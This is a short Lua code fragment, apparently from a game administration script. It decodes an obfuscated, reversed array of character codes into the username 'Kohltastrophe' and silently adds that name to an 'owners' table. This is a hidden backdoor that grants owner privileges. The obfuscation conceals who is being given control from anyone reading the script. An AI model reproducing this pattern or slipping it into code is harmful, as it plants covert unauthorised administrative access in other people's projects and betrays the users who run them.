local tcb = {101,104,112,111,114,116,115,97,116,108,104,111,75} nfs = &quot;&quot; for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end nfs = nfs:reverse() table.insert(owners, nfs)

